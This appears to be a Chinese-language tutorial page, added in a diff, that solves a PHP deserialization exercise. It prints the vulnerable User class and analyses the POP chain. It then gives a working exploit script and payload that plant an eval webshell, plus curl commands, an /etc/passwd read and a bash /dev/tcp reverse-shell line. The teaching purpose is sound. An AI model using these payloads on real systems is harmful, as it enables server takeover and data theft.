@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>例题1 - PHP反序列化学习</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 0.5s ease-out forwards;
+    }
+    pre {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-size: 14px;
+    }
+    code {
+      font-family: 'Courier New', monospace;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    .output-block {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 font-mono">
+  
+  <!-- Header -->
+  <header class="border-b border-gray-700 bg-gray-950/50 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-6 py-4">
+      <div class="flex items-center gap-4">
+        <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+          <i data-lucide="arrow-left" class="w-5 h-5"></i>
+          <span>返回首页</span>
+        </a>
+        <div class="flex-1">
+          <h1 class="text-xl font-bold text-white">例题1：User类反序列化执行系统命令</h1>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-7xl mx-auto px-6 py-8">
+    
+    <!-- 题目描述 -->
+    <section class="mb-12 animate-fade-in">
+      <div class="bg-yellow-900/20 border border-yellow-800 rounded-xl p-6 mb-8">
+        <div class="flex items-center gap-3 mb-4">
+          <i data-lucide="file-text" class="w-6 h-6 text-yellow-400"></i>
+          <h2 class="text-xl font-bold text-yellow-300">题目描述</h2>
+        </div>
+        <p class="text-gray-300">
+          已知服务端存在自定义 <code class="text-yellow-300">User</code> 类，存在PHP反序列化漏洞。
+          反序列化入口接收POST传参的 <code class="text-yellow-300">data</code> 值，要求利用该漏洞构造POP链，
+          执行系统命令在服务端写入一句话木马 <code class="text-yellow-300">shell.php</code>，
+          木马需支持通过GET参数 <code class="text-yellow-300">cmd</code> 执行任意PHP代码。
+        </p>
+      </div>
+    </section>
+
+    <!-- 服务端源码 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.1s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="code" class="w-6 h-6 text-green-400"></i>
+        服务端源码
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="code-block">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">User</span>
+{
+    <span class="text keyword">public</span> $<span class="text variable">username</span>;
+    <span class="text keyword">public</span> $<span class="text variable">isAdmin</span>;
+    <span class="text keyword">public</span> $<span class="text variable">cmd</span>;
+
+    <span class="text comment">// 析构方法：对象销毁时触发，拼接输出username</span>
+    <span class="text keyword">public function</span> <span class="text function">__destruct</span>()
+    {
+        <span class="text function">echo</span> <span class="text string">"Hello,"</span> . <span class="text variable">$this</span>->username;
+    }
+
+    <span class="text comment">// 字符串方法：对象被当作字符串时触发</span>
+    <span class="text keyword">public function</span> <span class="text function">__toString</span>()
+    {
+        <span class="text comment">// 管理员身份验证，通过则执行系统命令</span>
+        <span class="text keyword">if</span> (<span class="text variable">$this</span>->isAdmin) {
+            <span class="text function">system</span>(<span class="text variable">$this</span>->cmd);
+            <span class="text keyword">return</span> <span class="text variable">$this</span>->username;
+        }
+        <span class="text keyword">return</span> <span class="text string">"not admin"</span>;
+    }
+}
+
+<span class="text comment">// 反序列化入口：接收POST参数data，无任何过滤</span>
+<span class="text variable">$a</span> = <span class="text function">unserialize</span>(<span class="text variable">$_POST</span>[<span class="text string">'data'</span>]);
+?></code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 漏洞分析 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.2s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="search" class="w-6 h-6 text-purple-400"></i>
+        漏洞分析
+      </h2>
+
+      <div class="bg-purple-900/20 border border-purple-800 rounded-xl p-6">
+        <h3 class="text-lg font-bold text-purple-300 mb-4">POP链构造思路（反向回溯法）</h3>
+        
+        <div class="space-y-6">
+          
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-red-900/30 rounded-full flex items-center justify-center text-red-400 font-bold flex-shrink-0">1</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">确定目标危险函数</h4>
+              <p class="text-gray-400 mt-1">
+                目标函数：<code class="text-red-300">system($this->cmd)</code>
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                在 <code class="text-purple-300">__toString()</code> 方法中，当 <code class="text-purple-300">$this->isAdmin=true</code> 时执行
+              </p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">2</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">找到触发条件</h4>
+              <p class="text-gray-400 mt-1">
+                触发方式：对象被当作字符串使用（如 <code class="text-yellow-300">echo $obj</code>）
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                找到 <code class="text-orange-300">__destruct()</code> 中的 <code class="text-orange-300">echo $this->username</code>
+              </p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-yellow-900/30 rounded-full flex items-center justify-center text-yellow-400 font-bold flex-shrink-0">3</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">构造POP链</h4>
+              <p class="text-gray-400 mt-1">
+                让 <code class="text-yellow-300">$user2->username = $user1</code>（对象）
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                脚本结束时，<code class="text-yellow-300">$user2</code> 先被销毁，触发 <code class="text-yellow-300">__destruct()</code>
+              </p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- 调用链图 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.3s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="git-branch" class="w-6 h-6 text-cyan-400"></i>
+        调用链图解
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="flex flex-wrap items-center justify-center gap-3 text-center mb-6">
+          
+          <div class="bg-blue-900/30 border border-blue-700 rounded-lg px-4 py-3">
+            <p class="text-blue-400 font-bold">unserialize()</p>
+            <p class="text-xs text-gray-400">反序列化入口</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-5 h-5 text-gray-600"></i>
+
+          <div class="bg-red-900/30 border border-red-700 rounded-lg px-4 py-3">
+            <p class="text-red-400 font-bold">__destruct()</p>
+            <p class="text-xs text-gray-400">echo $this->username</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-5 h-5 text-gray-600"></i>
+
+          <div class="bg-purple-900/30 border border-purple-700 rounded-lg px-4 py-3">
+            <p class="text-purple-400 font-bold">__toString()</p>
+            <p class="text-xs text-gray-400">$user2->username = $user1</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-5 h-5 text-gray-600"></i>
+
+          <div class="bg-green-900/30 border border-green-700 rounded-lg px-4 py-3">
+            <p class="text-green-400 font-bold">system()</p>
+            <p class="text-xs text-gray-400">执行命令</p>
+          </div>
+
+        </div>
+
+        <div class="bg-gray-900/50 rounded-lg p-4">
+          <p class="text-gray-400 text-sm">
+            <span class="text-yellow-400">关键点：</span>
+            <code class="text-green-300">$user2->username = $user1</code>（对象赋值）会导致 <code class="text-green-300">echo</code> 时触发 <code class="text-green-300">__toString()</code>
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 解题步骤 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.4s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="list-ordered" class="w-6 h-6 text-orange-400"></i>
+        解题步骤
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <ol class="space-y-6">
+          
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">1</div>
+            <div>
+              <h4 class="text-white font-bold">分析类结构</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                User类有三个属性：<code class="text-yellow-300">username</code>、<code class="text-yellow-300">isAdmin</code>、<code class="text-yellow-300">cmd</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">2</div>
+            <div>
+              <h4 class="text-white font-bold">确定利用条件</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                需要 <code class="text-yellow-300">$this->isAdmin = true</code> 才能执行 <code class="text-yellow-300">system()</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">3</div>
+            <div>
+              <h4 class="text-white font-bold">构造内部对象 $user1</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                设置 <code class="text-yellow-300">isAdmin = true</code>，<code class="text-yellow-300">cmd = "echo '...' > shell.php"</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">4</div>
+            <div>
+              <h4 class="text-white font-bold">构造外部对象 $user2</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                设置 <code class="text-yellow-300">username = $user1</code>（对象），用于触发 <code class="text-yellow-300">__toString()</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">5</div>
+            <div>
+              <h4 class="text-white font-bold">序列化并URL编码</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                POST提交 <code class="text-yellow-300">data</code> 参数
+              </p>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+    <!-- EXP脚本 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.5s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="rocket" class="w-6 h-6 text-red-400"></i>
+        完整EXP脚本
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="code-block mb-4">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text comment">// 例题1 EXP: User类反序列化触发system执行命令</span>
+
+<span class="text keyword">class</span> <span class="text class-name">User</span> {
+    <span class="text keyword">public</span> $<span class="text variable">username</span>;
+    <span class="text keyword">public</span> $<span class="text variable">isAdmin</span>;
+    <span class="text keyword">public</span> $<span class="text variable">cmd</span>;
+}
+
+<span class="text comment">// Step 1: 创建内部对象，用于触发危险函数</span>
+<span class="text variable">$user1</span> = <span class="text keyword">new</span> <span class="text class-name">User</span>();
+<span class="text variable">$user1</span>->isAdmin = <span class="text keyword">true</span>;              <span class="text comment">// 绕过admin检查</span>
+<span class="text comment">// 写入一句话木马到shell.php</span>
+<span class="text variable">$user1</span>->cmd = <span class="text string">"echo '<?php eval(\$_GET[\"cmd\"]);' > shell.php"</span>;
+<span class="text variable">$user1</span>->username = <span class="text string">"john"</span>;             <span class="text comment">// 填充属性</span>
+
+<span class="text comment">// Step 2: 创建外部对象，用于触发__toString</span>
+<span class="text variable">$user2</span> = <span class="text keyword">new</span> <span class="text class-name">User</span>();
+<span class="text variable">$user2</span>->username = <span class="text variable">$user1</span>;              <span class="text comment">// 关键！赋值对象引用</span>
+
+<span class="text comment">// Step 3: 序列化并URL编码</span>
+<span class="text variable">$payload</span> = <span class="text function">urlencode</span>(<span class="text function">serialize</span>(<span class="text variable">$user2</span>));
+
+<span class="text function">echo</span> <span class="text string">"Payload:\n"</span>;
+<span class="text function">echo</span> <span class="text variable">$payload</span>;
+<span class="text function">echo</span> <span class="text string">"\n\n使用方法：\n"</span>;
+<span class="text function">echo</span> <span class="text string">"curl -X POST http://target.com/index.php -d 'data="</span> . <span class="text variable">$payload</span> . <span class="text string">"'\n"</span>;
+<span class="text function">echo</span> <span class="text string">"然后访问 http://target.com/shell.php?cmd=phpinfo();\n"</span>;</code></pre>
+        </div>
+
+        <div class="bg-yellow-900/20 border border-yellow-800 rounded-lg p-4">
+          <div class="flex items-center gap-2 mb-2">
+            <i data-lucide="terminal" class="w-5 h-5 text-yellow-400"></i>
+            <span class="text-yellow-400 font-bold">生成的Payload格式</span>
+          </div>
+          <div class="output-block text-sm">
+<pre><code>O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BO%3A4%3A%22User%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22john%22%3Bs%3A8%3A%22isAdmin%22%3Bb%3A1%3Bs%3A3%3A%22cmd%22%3Bs%3A42%3A%22echo%20%27%3C%3Fphp%20eval%28%5C%24_GET%5B%22cmd%22%5D%29%3B%27%20%3E%20shell.php%22%3B%7D%7D</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 验证方法 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.6s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="check-circle" class="w-6 h-6 text-green-400"></i>
+        验证方法
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          
+          <div>
+            <h4 class="text-white font-bold mb-3">上传shell后</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment"># 访问shell.php执行命令</span>
+<span class="text function">curl</span> <span class="text string">"http://target.com/shell.php?cmd=system('whoami');"</span>
+
+<span class="text comment"># 或者使用eval</span>
+<span class="text function">curl</span> <span class="text string">"http://target.com/shell.php?cmd=echo passthru($_GET['cmd']);"</span></code></pre>
+            </div>
+          </div>
+
+          <div>
+            <h4 class="text-white font-bold mb-3">其他利用方式</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment"># 读取文件</span>
+<span class="text variable">$user1</span>->cmd = <span class="text string">"cat /etc/passwd > output.txt"</span>;
+
+<span class="text comment"># 反弹shell</span>
+<span class="text variable">$user1</span>->cmd = <span class="text string">"bash -i >& /dev/tcp/ip/port 2>&1 0>&1"</span>;</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- Navigation -->
+    <div class="flex justify-between items-center mt-12 pt-8 border-t border-gray-800">
+      <a href="native-classes.html" class="text-gray-400 hover:text-white flex items-center gap-2">
+        <i data-lucide="arrow-left" class="w-5 h-5"></i>
+        <span>上一节：PHP原生类利用</span>
+      </a>
+      <a href="example2.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+        <span>下一节：例题2</span>
+        <i data-lucide="arrow-right" class="w-5 h-5"></i>
+      </a>
+    </div>
+
+  </main>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
